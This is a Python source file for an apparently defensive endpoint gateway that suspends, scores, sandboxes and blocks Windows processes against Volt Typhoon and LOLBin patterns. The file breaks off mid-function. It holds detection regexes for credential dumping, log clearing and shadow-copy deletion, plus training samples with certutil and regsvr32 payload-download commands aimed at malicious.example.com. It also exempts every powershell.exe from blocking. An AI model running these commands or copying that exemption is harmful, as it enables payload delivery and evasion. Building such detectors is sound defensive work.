from entropy_analyzer import EntropyAnalyzer
from vm_manager import VirtualBoxManager
from ml_analyzer import MLThreatAnalyzer
from process_analyzer import ProcessTreeAnalyzer
from process_hook import ProcessInterceptor
from behavioral_analyzer import BehavioralAnalyzer
from lolbins_ml_integration import LOLBinsDatabase, EnhancedMLThreatAnalyzer
from lolbin_commands import LOLBinsDetector
import asyncio
import json
import time
import logging
import re
import csv
from datetime import datetime
import hashlib
import os
import threading
import queue
import psutil
import joblib



class EnhancedVoltTyphoonDetector:
    def __init__(self):
        # Volt Typhoon specific command patterns
        self.volt_typhoon_patterns = {
            # Network reconnaissance and pivoting
            'network_recon': [
                r'netsh\s+interface\s+portproxy\s+add',
                r'netsh\s+interface\s+portproxy\s+set',
                r'netsh\s+advfirewall\s+firewall\s+add\s+rule',
                r'netsh\s+wlan\s+show\s+profile',
                r'arp\s+-a',
                r'ipconfig\s+/all',
                r'route\s+print',
                r'nbtstat\s+-n',
            ],
            
            # Credential access and lateral movement
            'credential_access': [
                r'nltest\s+/domain_trusts',
                r'nltest\s+/dclist',
                r'net\s+group\s+"domain\s+admins"',
                r'net\s+user\s+/domain',
                r'net\s+accounts\s+/domain',
                r'dsquery\s+user',
                r'dsquery\s+computer',
                r'dsquery\s+group',
            ],
            
            # Persistence mechanisms
            'persistence': [
                r'schtasks\s+/create.*?/sc\s+onlogon',
                r'schtasks\s+/create.*?/ru\s+system',
                r'sc\s+create.*?binpath.*?cmd',
                r'reg\s+add.*?\\run\\',
                r'reg\s+add.*?\\services\\',
                r'wmic\s+service\s+call\s+create',
            ],
            
            # Defense evasion
            'defense_evasion': [
                r'powershell.*?-windowstyle\s+hidden',
                r'powershell.*?-executionpolicy\s+bypass',
                r'powershell.*?-encodedcommand',
                r'certutil.*?-urlcache.*?-split.*?-f',
                r'bitsadmin\s+/transfer',
                r'regsvr32\s+/s\s+/n\s+/u\s+/i:',
                r'mshta\s+vbscript:',
                r'rundll32\s+javascript:',
                r'powershell.*?-nop',
                r'powershell.*?-noexit',
                r'powershell.*?-noni',
                r'powershell.*?-ep\s+bypass',
                r'wmic.*?process.*?call.*?create',
                r'wmic.*?/node:.*?/user:.*?/password:',
                r'vssadmin\s+delete\s+shadows',
                r'bcdedit\s+/set\s+safeboot',
                r'attrib\s+\+s\s+\+h',
                r'icacls\s+.*?/grant',
                r'wevtutil\s+cl',
                r'net\s+stop\s+\w+',
                r'net\s+start\s+\w+',
            ],
            
            # Discovery and enumeration
            'discovery': [
                r'tasklist\s+/svc',
                r'whoami\s+/all',
                r'whoami\s+/groups',
                r'systeminfo',
                r'wmic\s+computersystem\s+get',
                r'wmic\s+process\s+list\s+full',
                r'net\s+localgroup\s+administrators',
                r'quser',
                r'query\s+session',
                r'net\s+view',
                r'net\s+user',
                r'net\s+group',
                r'net\s+share',
                r'arp\s+-a',
                r'ipconfig\s+/all',
                r'route\s+print',
                r'nbtstat\s+-a',
                r'nbtstat\s+-n',
                r'nbtstat\s+-s',
            ],
            
            # Data exfiltration preparation
            'collection': [
                r'forfiles.*?/m\s+\*\..*?/c\s+"cmd\s+/c',
                r'findstr.*?/s.*?/i.*?password',
                r'dir.*?/s.*?\*\.txt',
                r'copy.*?\\\\.*?\\c\$',
                r'xcopy.*?/s.*?/h.*?/e',
                r'robocopy.*?/mir',
                r'copy\s+.*?\\\\.*?\\admin\$',
                r'copy\s+.*?\\\\.*?\\c\$',
                r'robocopy\s+.*?\\\\.*?\\c\$',
                r'rar\.exe\s+a\s+.*?\.rar',
                r'7z\.exe\s+a\s+.*?\.7z',
                r'winrar\.exe\s+a\s+.*?\.zip',
            ]
        }
        
        # Suspicious process chains specific to Volt Typhoon
        self.volt_process_chains = [
            ('explorer.exe', 'cmd.exe', 'netsh.exe'),
            ('winlogon.exe', 'cmd.exe', 'nltest.exe'),
            ('services.exe', 'svchost.exe', 'powershell.exe'),
            ('lsass.exe', 'cmd.exe', 'tasklist.exe'),
            ('spoolsv.exe', 'cmd.exe', 'sc.exe'),
        ]
        
        # Network indicators
        self.suspicious_network_patterns = [
            r'(\d{1,3}\.){3}\d{1,3}:443',  # Suspicious HTTPS connections
            r'(\d{1,3}\.){3}\d{1,3}:80',   # Suspicious HTTP connections
            r'tunnel|proxy|socks',          # Tunneling keywords
        ]

    def analyze_for_volt_typhoon(self, process_info, command_line):
        """Enhanced analysis specifically for Volt Typhoon TTPs"""
        risk_score = 0
        detected_patterns = []
        
        cmd_lower = command_line.lower()
        process_name = process_info.get('name', '').lower()
        
        # Check for Volt Typhoon command patterns
        for category, patterns in self.volt_typhoon_patterns.items():
            for pattern in patterns:
                if re.search(pattern, command_line, re.IGNORECASE):
                    risk_score += 3.0
                    detected_patterns.append({
                        'category': category,
                        'pattern': pattern,
                        'severity': 'HIGH'
                    })
        
        # Check for suspicious timing (Volt Typhoon often operates during off-hours)
        current_hour = datetime.now().hour
        if current_hour < 6 or current_hour > 22:  # Between 10 PM and 6 AM
            risk_score += 1.0
            detected_patterns.append({
                'category': 'timing',
                'pattern': 'off_hours_activity',
                'severity': 'MEDIUM'
            })
        
        # Check for multiple LOLBins in single command
        lolbin_count = sum(1 for lolbin in self.get_extended_lolbins() 
                          if lolbin in cmd_lower)
        if lolbin_count > 2:
            risk_score += 2.0
            detected_patterns.append({
                'category': 'lolbin_chaining',
                'pattern': f'{lolbin_count}_lolbins_detected',
                'severity': 'HIGH'
            })
        
        # Check for base64 encoded PowerShell (common in Volt Typhoon)
        if 'powershell' in process_name:
            b64_patterns = [
                r'[A-Za-z0-9+/]{50,}={0,2}',  # Base64
                r'-enc.*?[A-Za-z0-9+/]{20,}',  # Encoded command
                r'frombase64string',           # Base64 decoding
                r'convert::frombase64string'   # .NET Base64 decoding
            ]
            
            for pattern in b64_patterns:
                if re.search(pattern, command_line, re.IGNORECASE):
                    risk_score += 2.5
                    detected_patterns.append({
                        'category': 'obfuscation',
                        'pattern': 'base64_encoding',
                        'severity': 'HIGH'
                    })
                    break
        if re.search(r'(&&|\|\||;){2,}', command_line):
            risk_score += 1.5
            detected_patterns.append({
                'category': 'chaining',
                'pattern': 'multiple_command_chaining',
                'severity': 'MEDIUM'
            })
        if re.search(r'(0x[0-9a-fA-F]{2,}){4,}', command_line):
            risk_score += 1.5
            detected_patterns.append({
                'category': 'obfuscation',
                'pattern': 'hex_encoding',
                'severity': 'HIGH'
            })
        
        return {
            'volt_typhoon_risk_score': min(risk_score, 10.0),
            'detected_patterns': detected_patterns,
            'is_volt_typhoon_like': risk_score >= 3.0
        }
    
    def get_extended_lolbins(self):
        """Extended LOLBins list including recent additions"""
        return [
            # Original list
            'powershell.exe', 'cmd.exe', 'mshta.exe', 'wscript.exe', 'cscript.exe',
            'regsvr32.exe', 'rundll32.exe', 'forfiles.exe', 'debug.exe',
            'certutil.exe', 'bitsadmin.exe', 'netsh.exe', 'schtasks.exe',
            'tasklist.exe', 'sc.exe', 'whoami.exe', 'net.exe', 'nltest.exe', 
            'msiexec.exe', 'hh.exe', 'ieexec.exe', 'installutil.exe', 'msxsl.exe',
            'dnscmd.exe', 'diskshadow.exe', 'makecab.exe', 'expand.exe',
            'xwizard.exe', 'cmstp.exe', 'scriptrunner.exe', 'msdt.exe',
            'forfiles.exe', 'reg.exe', 'regedit.exe', 'regedt32.exe',
            
            # Additional LOLBins frequently used by Volt Typhoon
            'wbemtest.exe', 'odbcconf.exe', 'regasm.exe', 'regsvcs.exe',
            'installutil.exe', 'msbuild.exe', 'csi.exe', 'rcsi.exe',
            'winrm.vbs', 'slmgr.vbs', 'pubprn.vbs', 'syncappvpublishingserver.vbs',
            'pnputil.exe', 'fltmc.exe', 'relog.exe', 'wusa.exe',
            'esentutl.exe', 'vsjitdebugger.exe', 'sqldumper.exe',
            'sqlps.exe', 'dtexec.exe', 'dnscmd.exe', 'dsacls.exe',
            'ldifde.exe', 'csvde.exe', 'adplus.exe', 'appvlp.exe'
        ]


class SecurityGateway:
    def __init__(self):
        self.process_interceptor = ProcessInterceptor()
        self.vm_manager = VirtualBoxManager()
        self.entropy_analyzer = EntropyAnalyzer()
        self.process_analyzer = ProcessTreeAnalyzer()
        self.lolbins_db = LOLBinsDatabase('full_lolbins_raw.txt')
        self.ml_analyzer = EnhancedMLThreatAnalyzer(self.lolbins_db)
        self.volt_detector = EnhancedVoltTyphoonDetector()
        self.lolbins_detector = LOLBinsDetector()
        self.lolbins_detector.load_model("lolbins_detector.pkl")
        
        # Cache for analyzed operations
        self.analysis_cache = {}
        self.cache_ttl = 3600  # 1 hour
        
        # Risk thresholds
        self.risk_thresholds = {
            'allow': 3.0,
            'monitor': 6.0,
            'block': 8.0
        }
        
        # Active monitoring
        self.monitoring_active = False
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('security_gateway.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    async def start_protection(self):
        """Start the security gateway"""
        self.logger.info("Starting Security Gateway...")
        
        # Load or train ML model
        await self._initialize_ml_model()
                    
        # Start process interception
        self.process_interceptor.start_interception()
        self.monitoring_active = True
        
        # Main monitoring loop
        await self._monitoring_loop()
        
    async def _initialize_ml_model(self):
        """Initialize ML model - load existing or train new one"""
        if not os.path.exists("ml_model.pkl"):
            self.logger.info("ML model not found. Training a new model...")

            # Sample normal processes for training (including benign LOLBins)
            sample_normal_processes = [
                {"name": "explorer.exe", "cmdline": ["explorer.exe"]},
                {"name": "notepad.exe", "cmdline": ["notepad.exe"]},
                {"name": "calc.exe", "cmdline": ["calc.exe"]},
                {"name": "chrome.exe", "cmdline": ["chrome.exe"]},
                {"name": "firefox.exe", "cmdline": ["firefox.exe"]},
                # Benign LOLBins usage
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "echo", "Hello"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-Command", "Get-Help"]},
                {"name": "regsvr32.exe", "cmdline": ["regsvr32.exe", "/?"]},
                {"name": "rundll32.exe", "cmdline": ["rundll32.exe", "shell32.dll,Control_RunDLL", "desk.cpl"]},
                {"name": "mshta.exe", "cmdline": ["mshta.exe", "about:blank"]},
                {"name": "bitsadmin.exe", "cmdline": ["bitsadmin.exe", "/list"]},
                {"name": "schtasks.exe", "cmdline": ["schtasks.exe", "/query"]},
                {"name": "whoami.exe", "cmdline": ["whoami.exe"]},
                # Volt Typhoon-like suspicious LOLBins usage (for anomaly detection)
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-windowstyle", "hidden", "-encodedcommand", "aGVsbG8="]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.0.1 connectport=80"]},
                {"name": "schtasks.exe", "cmdline": ["schtasks.exe", "/create", "/sc", "onlogon", "/tn", "vt-task", "/tr", "cmd.exe /c whoami"]},
                {"name": "certutil.exe", "cmdline": ["certutil.exe", "-urlcache", "-split", "-f", "http://malicious.example.com/payload.exe", "payload.exe"]},
                {"name": "regsvr32.exe", "cmdline": ["regsvr32.exe", "/s", "/n", "/u", "/i:http://malicious.example.com/script.sct", "scrobj.dll"]},
            ]

            # Read all LOLBins
            with open("all_lolbins.txt", encoding="utf-8") as f:
                all_lolbins = [line.strip() for line in f if line.strip()]

            # Benign and malicious templates
            benign_templates = [
                ["{bin}"],  # Just running the binary
                ["{bin}", "/?"],  # Help
                ["{bin}", "-h"],  # Help
            ]
            malicious_templates = [
                # Volt Typhoon/LOLBins TTPs
                ["{bin}", "-windowstyle", "hidden", "-encodedcommand", "aGVsbG8="],
                ["{bin}", "/c", "netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.0.1 connectport=80"],
                ["{bin}", "/create", "/sc", "onlogon", "/tn", "vt-task", "/tr", "cmd.exe /c whoami"],
                ["{bin}", "-urlcache", "-split", "-f", "http://malicious.example.com/payload.exe", "payload.exe"],
                ["{bin}", "/s", "/n", "/u", "/i:http://malicious.example.com/script.sct", "scrobj.dll"],
            ]

            sample_normal_processes = []
            for bin in all_lolbins:
                for tpl in benign_templates:
                    sample_normal_processes.append({"name": bin, "cmdline": [arg.format(bin=bin) for arg in tpl]})
                for tpl in malicious_templates:
                    sample_normal_processes.append({"name": bin, "cmdline": [arg.format(bin=bin) for arg in tpl]})
            
            if self.ml_analyzer.train_baseline(sample_normal_processes):
                self.ml_analyzer.save_model("ml_model.pkl")
                self.logger.info("Model trained and saved as ml_model.pkl")
            else:
                self.logger.error("Failed to train model — no valid baseline data.")
        else:
            self.logger.info("Loading existing ML model...")
            if self.ml_analyzer.load_model("ml_model.pkl"):
                self.logger.info("ML model loaded successfully")
            else:
                self.logger.error("Failed to load existing ML model")
        
    async def _monitoring_loop(self):
        """Main monitoring loop"""
        while self.monitoring_active:
            try:
                # Check for intercepted processes
                if not self.process_interceptor.process_queue.empty():
                    process_info = self.process_interceptor.process_queue.get()
                    await self._handle_intercepted_process(process_info)
                    
                await asyncio.sleep(0.1)  # Small delay to prevent CPU spinning
                
            except Exception as e:
                self.logger.error(f"Error in monitoring loop: {e}")
                await asyncio.sleep(1)
                
    async def _handle_intercepted_process(self, process_info):
        """Handle an intercepted process"""
        self.logger.info(f"Intercepted process: {process_info['name']} (PID: {process_info['pid']})")
        pid = process_info['pid']
        
        # Skip system processes
        system_names = {
            "System Idle Process", "System", "Registry", "smss.exe", "csrss.exe", "wininit.exe",
            "services.exe", "lsass.exe", "svchost.exe", "winlogon.exe", "explorer.exe",
            "fontdrvhost.exe", "dwm.exe", "ctfmon.exe", "spoolsv.exe", "RuntimeBroker.exe",
            "ShellExperienceHost.exe", "SearchIndexer.exe", "StartMenuExperienceHost.exe",
            "conhost.exe", "taskhostw.exe", "AggregatorHost.exe", "LsaIso.exe", "msedgewebview2.exe"
        }
        if process_info['name'] in system_names or process_info['pid'] == 0 or process_info['pid'] == 4:
            self.logger.info(f"Skipping system process: {process_info['name']} (PID: {process_info['pid']})")
            return
        
        try:
            proc = psutil.Process(pid)
            proc.suspend()  # Immediately suspend the process
        except Exception as e:
            self.logger.error(f"Failed to suspend process {pid} for analysis: {e}")

        # Generate cache key
        cache_key = self._generate_cache_key(process_info)
        
        # Check cache first
        if cache_key in self.analysis_cache:
            cached_result = self.analysis_cache[cache_key]
            if time.time() - cached_result['timestamp'] < self.cache_ttl:
                self.logger.info(f"Using cached result for {process_info['name']}")
                await self._make_decision(process_info, cached_result['analysis'])
                return
                
        # Perform full analysis
        analysis_result = await self._analyze_process(process_info)
        
        # Cache result
        self.analysis_cache[cache_key] = {
            'analysis': analysis_result,
            'timestamp': time.time()
        }
        
        # Make decision
        await self._make_decision(process_info, analysis_result)
        
        # After decision:
        decision = analysis_result.get('final_decision', 'ALLOW')
        if decision == 'ALLOW':
            try:
                proc.resume()  # Resume only if allowed
                self.logger.info(f"Process {pid} resumed after allow decision.")
            except Exception as e:
                self.logger.error(f"Failed to resume process {pid}: {e}")
        # If not allowed, process remains suspended or is terminated/quarantined as per your logic.
        
    def _generate_cache_key(self, process_info):
        """Generate cache key for process"""
        key_data = f"{process_info['name']}:{process_info.get('cmdline', '')}"
        return hashlib.md5(key_data.encode()).hexdigest()
        
    async def _analyze_process(self, process_info):
        """Comprehensive process analysis"""
        analysis_start = time.time()
        analysis_results = {
            'timestamp': datetime.now().isoformat(),
            'process_info': process_info,
            'analyses': {}
        }
        
        try:
            # 1. Process tree analysis
            tree_analysis = self.process_analyzer.analyze_process_chain(process_info['pid'])
            analysis_results['analyses']['process_tree'] = tree_analysis
            
            # 2. ML-based analysis
            ml_analysis = self.ml_analyzer.predict_threat(process_info)
            analysis_results['analyses']['ml_prediction'] = ml_analysis
            
            # 3. Volt Typhoon specific analysis
            command_line = process_info.get('cmdline', '')
            volt_analysis = self.volt_detector.analyze_for_volt_typhoon(process_info, command_line)
            analysis_results['analyses']['volt_typhoon'] = volt_analysis

            # 4. LOLBins ML-based analysis
            cmdline_str = process_info.get('cmdline', '')
            lolbins_pred, lolbins_prob = self.lolbins_detector.predict([cmdline_str])
            analysis_results['analyses']['lolbins_ml'] = {
                'prediction': int(lolbins_pred[0]),
                'probability': float(lolbins_prob[0])
            }
            
            # --- Pattern match logic: if pattern matches, set risk high ---
            if volt_analysis.get('is_volt_typhoon_like') or analysis_results['analyses']['lolbins_ml']['prediction'] == 1:
                # Force high risk to trigger block
                analysis_results['final_risk_score'] = 10.0
                analysis_results['analyses']['pattern_matched'] = True
                return analysis_results
            # 5. Sandbox testing for high-risk processes
            initial_risk = process_info.get('risk_level', 1.0)
            volt_risk = volt_analysis.get('volt_typhoon_risk_score', 0.0)
            
            if initial_risk > 5.0 or tree_analysis.get('risk_score', 0) > 5.0 or volt_risk > 3.0:
                sandbox_result = await self._sandbox_test(process_info)
                analysis_results['analyses']['sandbox'] = sandbox_result
            else:
                analysis_results['analyses']['sandbox'] = {'skipped': True, 'reason': 'Low initial risk'}
                
            # 6. Calculate final risk score
            final_risk = self._calculate_final_risk(analysis_results['analyses'])
            analysis_results['final_risk_score'] = final_risk
            
        except Exception as e:
            self.logger.error(f"Error during analysis: {e}")
            analysis_results['error'] = str(e)
            analysis_results['final_risk_score'] = 10.0  # Assume high risk on error
            
        analysis_results['analysis_time'] = time.time() - analysis_start
        return analysis_results
        
    async def _sandbox_test(self, process_info):
        """Test process in sandbox environment"""
        self.logger.info(f"Starting sandbox test for {process_info['name']}")
        
        try:
            # Create sandbox VM
            vm_name = self.vm_manager.create_sandbox_vm()
            if not vm_name:
                return {'error': 'Failed to create sandbox VM'}
                
            # Prepare command for testing
            test_command = self._prepare_sandbox_command(process_info)
            
            # Execute in sandbox
            execution_result = self.vm_manager.execute_in_vm(vm_name, test_command, timeout=30)
            
            # Analyze results
            sandbox_analysis = self._analyze_sandbox_results(execution_result)
            
            # Cleanup
            self.vm_manager.cleanup_vm(vm_name)
            
            return sandbox_analysis
            
        except Exception as e:
            self.logger.error(f"Sandbox testing error: {e}")
            return {'error': str(e), 'risk_assessment': 'HIGH'}
            
    def _prepare_sandbox_command(self, process_info):
        """Prepare command for sandbox execution"""
        name = process_info['name'].lower()
        cmdline = process_info.get('cmdline', '')
        
        if 'powershell' in name:
            # For PowerShell, create a monitored execution
            return f"""
            # Create baseline file states
            $baseline = Get-ChildItem C:\\temp -Recurse -ErrorAction SilentlyContinue | Measure-Object Length -Sum
            
            # Execute the command with monitoring
            try {{
                {cmdline}
            }} catch {{
                Write-Output "EXECUTION_ERROR: $($_.Exception.Message)"
            }}
            
            # Check for file system changes
            $postExec = Get-ChildItem C:\\temp -Recurse -ErrorAction SilentlyContinue | Measure-Object Length -Sum
            $changeRatio = if ($baseline.Sum -gt 0) {{ ($postExec.Sum - $baseline.Sum) / $baseline.Sum }} else {{ 0 }}
            
            Write-Output "BASELINE_SIZE: $($baseline.Sum)"
            Write-Output "POST_EXEC_SIZE: $($postExec.Sum)"
            Write-Output "CHANGE_RATIO: $changeRatio"
            
            # Check for network activity
            $connections = Get-NetTCPConnection -ErrorAction SilentlyContinue | Where-Object {{ $_.State -eq 'Established' }}
            Write-Output "NETWORK_CONNECTIONS: $($connections.Count)"
            
            # Check for new processes
            $processes = Get-Process | Where-Object {{ $_.StartTime -gt (Get-Date).AddMinutes(-1) }}
            Write-Output "NEW_PROCESSES: $($processes.Count)"
            """
        
        elif 'cmd' in name:
            return f"""
            echo BASELINE_CHECK
            dir C:\\temp /s > baseline.txt 2>nul
            
            REM Execute the command
            {cmdline}
            
            echo POST_EXEC_CHECK
            dir C:\\temp /s > postexec.txt 2>nul
            
            REM Simple file count comparison
            for /f %%i in ('type baseline.txt 2^>nul ^| find /c /v ""') do set baseline_count=%%i
            for /f %%i in ('type postexec.txt 2^>nul ^| find /c /v ""') do set postexec_count=%%i
            
            echo BASELINE_FILES: %baseline_count%
            echo POST_EXEC_FILES: %postexec_count%
            """
        
        else:
            # For other executables, wrap in PowerShell monitoring
            return f"""
            $baseline = Get-ChildItem C:\\temp -Recurse -ErrorAction SilentlyContinue | Measure-Object Length -Sum
            
            # Execute the process
            try {{
                Start-Process -FilePath "{process_info['name']}" -ArgumentList "{cmdline}" -Wait -NoNewWindow -ErrorAction Stop
            }} catch {{
                Write-Output "EXECUTION_ERROR: $($_.Exception.Message)"
            }}
            
            $postExec = Get-ChildItem C:\\temp -Recurse -ErrorAction SilentlyContinue | Measure-Object Length -Sum
            Write-Output "BASELINE_SIZE: $($baseline.Sum)"
            Write-Output "POST_EXEC_SIZE: $($postExec.Sum)"
            """
            
    def _analyze_sandbox_results(self, execution_result):
        """Analyze sandbox execution results"""
        if not execution_result.get('success', False):
            return {
                'risk_level': 'HIGH',
                'reason': 'Execution failed in sandbox',
                'details': execution_result.get('error', 'Unknown error'),
                'risk_score': 8.0
            }
            
        output = execution_result.get('output', '')
        risk_score = 0.0
        risk_factors = []
        
        # Parse output for indicators
        lines = output.split('\n')
        metrics = {}
        
        for line in lines:
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    key, value = parts
                    metrics[key.strip()] = value.strip()
                
        # Analyze file system changes
        try:
            baseline_size = float(metrics.get('BASELINE_SIZE', 0))
            postexec_size = float(metrics.get('POST_EXEC_SIZE', 0))
            
            if baseline_size > 0:
                change_ratio = abs(postexec_size - baseline_size) / baseline_size
                if change_ratio > 0.5:  # 50% change in file sizes
                    risk_score += 3.0
                    risk_factors.append(f'Significant file system changes: {change_ratio:.2%}')
        except (ValueError, TypeError):
            pass
                
        # Check for mass file creation/deletion
        try:
            baseline_files = int(metrics.get('BASELINE_FILES', 0))
            postexec_files = int(metrics.get('POST_EXEC_FILES', 0))
            
            if baseline_files > 0:
                file_change_ratio = abs(postexec_files - baseline_files) / baseline_files
                if file_change_ratio > 0.3:  # 30% change in file count
                    risk_score += 2.0
                    risk_factors.append(f'File count change: {file_change_ratio:.2%}')
        except (ValueError, TypeError):
            pass
                
        # Check for network activity
        try:
            connections = int(metrics.get('NETWORK_CONNECTIONS', 0))
            if connections > 5:  # More than 5 network connections
                risk_score += 2.0
                risk_factors.append(f'High network activity: {connections} connections')
        except (ValueError, TypeError):
            pass
            
        # Check for process spawning
        try:
            new_processes = int(metrics.get('NEW_PROCESSES', 0))
            if new_processes > 3:  # More than 3 new processes
                risk_score += 1.5
                risk_factors.append(f'Multiple process creation: {new_processes} processes')
        except (ValueError, TypeError):
            pass
            
        # Check for execution errors
        if 'EXECUTION_ERROR' in output:
            risk_score += 1.0
            risk_factors.append('Command execution errors detected')
            
        # Determine risk level
        if risk_score >= 6.0:
            risk_level = 'CRITICAL'
        elif risk_score >= 3.0:
            risk_level = 'HIGH'
        elif risk_score >= 1.0:
            risk_level = 'MEDIUM'
        else:
            risk_level = 'LOW'
            
        return {
            'risk_level': risk_level,
            'risk_score': min(risk_score, 10.0),
            'risk_factors': risk_factors,
            'sandbox_metrics': metrics,
            'execution_time': execution_result.get('execution_time', 0)
        }
        
    def _calculate_final_risk(self, analyses):
        """Calculate final risk score from all analyses"""
        weights = {
            'process_tree': 0.25,
            'ml_prediction': 0.25,
            'volt_typhoon': 0.25,
            'sandbox': 0.25
        }
        
        total_score = 0.0
        total_weight = 0.0
        
        # Process tree analysis
        if 'process_tree' in analyses and 'risk_score' in analyses['process_tree']:
            score = analyses['process_tree']['risk_score']
            total_score += score * weights['process_tree']
            total_weight += weights['process_tree']
            
        # ML prediction
        if 'ml_prediction' in analyses and 'risk_score' in analyses['ml_prediction']:
            score = analyses['ml_prediction']['risk_score']
            total_score += score * weights['ml_prediction']
            total_weight += weights['ml_prediction']
            
        # Volt Typhoon analysis
        if 'volt_typhoon' in analyses and 'volt_typhoon_risk_score' in analyses['volt_typhoon']:
            score = analyses['volt_typhoon']['volt_typhoon_risk_score']
            total_score += score * weights['volt_typhoon']
            total_weight += weights['volt_typhoon']
            
        # Sandbox analysis
        if 'sandbox' in analyses and 'risk_score' in analyses['sandbox']:
            score = analyses['sandbox']['risk_score']
            total_score += score * weights['sandbox']
            total_weight += weights['sandbox']
        elif 'sandbox' in analyses and analyses['sandbox'].get('skipped'):
            # If sandbox was skipped, redistribute weight to other analyses
            if total_weight > 0:
                # Redistribute sandbox weight proportionally
                redistribution_factor = (1 + weights['sandbox']) / total_weight if total_weight > 0 else 1
                total_score *= redistribution_factor
                total_weight = 1.0
                
        final_score = total_score / total_weight if total_weight > 0 else 5.0
        return min(final_score, 10.0)
        
    async def _make_decision(self, process_info, analysis_result):
        """Make final decision on process execution"""
        risk_score = analysis_result.get('final_risk_score', 5.0)
        pid = process_info['pid']
        process_name = process_info['name']

        # --- PowerShell Admin Exception ---
        if process_name.lower() == "powershell.exe":
            self.logger.info(f"EXCEPTION: Allowing PowerShell.exe (PID: {pid}) for admin/testing purposes.")
            decision = 'ALLOW'
            action = self._allow_process
        elif risk_score < self.risk_thresholds['allow']:
            decision = 'ALLOW'
            action = self._allow_process
        elif risk_score < self.risk_thresholds['monitor']:
            decision = 'MONITOR'
            action = self._monitor_process
        elif risk_score < self.risk_thresholds['block']:
            decision = 'QUARANTINE'
            action = self._quarantine_process
        else:
            decision = 'BLOCK'
            action = self._block_process

        decision_data = {
            'timestamp': datetime.now().isoformat(),
            'process': process_name,
            'pid': pid,
            'risk_score': risk_score,
            'analysis_result': analysis_result,
            'decision': decision
        }

        self.logger.info(f"Decision for {process_name} (PID: {pid}): {decision} (Risk: {risk_score:.2f})")

        # Execute decision
        try:
            await action(process_info, analysis_result)
            decision_data['action_successful'] = True
        except Exception as e:
            self.logger.error(f"Error executing decision {decision}: {e}")
            decision_data['action_successful'] = False
            decision_data['error'] = str(e)

        # Log decision
        self._log_decision(decision_data)
        
    async def _allow_process(self, process_info, analysis_result):
        """Allow process to continue normally"""
        self.logger.info(f"Allowing process {process_info['name']} (PID: {process_info['pid']})")
        # Process continues normally, no action needed
        
    async def _monitor_process(self, process_info, analysis_result):
        """Monitor process with enhanced logging"""
        pid = process_info['pid']
        self.logger.info(f"Enhanced monitoring for process {process_info['name']} (PID: {pid})")
        
        # Start enhanced monitoring in background
        asyncio.create_task(self._enhanced_monitoring(pid))
        
    async def _quarantine_process(self, process_info, analysis_result):
        """Quarantine process (suspend and isolate)"""
        pid = process_info['pid']
        self.logger.warning(f"Quarantining process {process_info['name']} (PID: {pid})")
        
        try:
            import psutil
            proc = psutil.Process(pid)
            proc.suspend()
            
            # Log quarantine action
            self.logger.info(f"Process {pid} suspended successfully")
            
        except psutil.NoSuchProcess:
            self.logger.info(f"Process {pid} already terminated")
        except Exception as e:
            self.logger.error(f"Failed to quarantine process {pid}: {e}")
            
    async def _block_process(self, process_info, analysis_result):
        """Block/terminate process immediately"""
        pid = process_info['pid']
        self.logger.error(f"BLOCKING process {process_info['name']} (PID: {pid}) - HIGH RISK DETECTED")
        
        try:
            import psutil
            proc = psutil.Process(pid)
            proc.terminate()
            
            # Wait for termination
            try:
                proc.wait(timeout=5)
            except psutil.TimeoutExpired:
                proc.kill()  # Force kill if terminate doesn't work
                
            self.logger.info(f"Process {pid} terminated successfully")
            
            # Create system snapshot for potential rollback
            await self._create_emergency_snapshot()
            
        except psutil.NoSuchProcess:
            self.logger.info(f"Process {pid} already terminated")
        except Exception as e:
            self.logger.error(f"Failed to block process {pid}: {e}")
            
    async def _enhanced_monitoring(self, pid):
        """Enhanced monitoring for suspicious processes"""
        try:
            import psutil
            proc = psutil.Process(pid)
            
            monitoring_duration = 300  # 5 minutes
            check_interval = 5  # 5 seconds
            
            for _ in range(monitoring_duration // check_interval):
                if not proc.is_running():
                    break
                    
                # Monitor file operations
                try:
                    open_files = proc.open_files()
                    if len(open_files) > 50:  # Unusually high file handle count
                                                self.logger.warning(f"Process {pid} has an unusually high number of open files: {len(open_files)}")
                except Exception as e:
                    self.logger.error(f"Error monitoring open files for process {pid}: {e}")

                # Monitor network connections
                try:
                    connections = proc.connections()
                    if len(connections) > 10:  # Unusually high number of network connections
                        self.logger.warning(f"Process {pid} has an unusually high number of network connections: {len(connections)}")
                except Exception as e:
                    self.logger.error(f"Error monitoring network connections for process {pid}: {e}")

                await asyncio.sleep(check_interval)

        except psutil.NoSuchProcess:
            self.logger.info(f"Process {pid} no longer exists during enhanced monitoring")
        except Exception as e:
            self.logger.error(f"Error during enhanced monitoring of process {pid}: {e}")

    async def _create_emergency_snapshot(self):
        """Create a system snapshot for potential rollback"""
        self.logger.info("Creating emergency system snapshot...")
        # Implementation for creating a system snapshot goes here
        # This could involve using a VM snapshot, backup software, etc.
        await asyncio.sleep(1)  # Simulate snapshot creation delay
        self.logger.info("Emergency system snapshot created successfully")

    def _log_decision(self, decision_data):
        """Log decision data to a CSV file for readability and ML analysis"""
        # Human-readable log
        log_file = "decision_log.csv"
        fieldnames = [
            "timestamp", "process", "pid", "risk_score", "decision", "action_successful"
        ]
        write_header = not os.path.exists(log_file)
        try:
            with open(log_file, "a", newline='', encoding="utf-8") as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                if write_header:
                    writer.writeheader()
                row = {k: decision_data.get(k, "") for k in fieldnames}
                writer.writerow(row)
        except Exception as e:
            self.logger.error(f"Failed to log decision (CSV): {e}")

        # ML-friendly log (flattened features)
        ml_log_file = "ml_decision_log.csv"
        ml_fields = [
            "timestamp", "process", "pid", "risk_score", "decision"
        ]
        # Add more fields as needed from your analysis_result['analyses'] or features
        analysis = decision_data.get("analysis_result", {})
        # Example: flatten volt_typhoon risk and ML risk if present
        if "analyses" in analysis:
            ml_fields += [
                "volt_typhoon_risk_score",
                "ml_risk_score"
            ]
            volt = analysis["analyses"].get("volt_typhoon", {})
            ml = analysis["analyses"].get("ml_prediction", {})
            ml_row = {
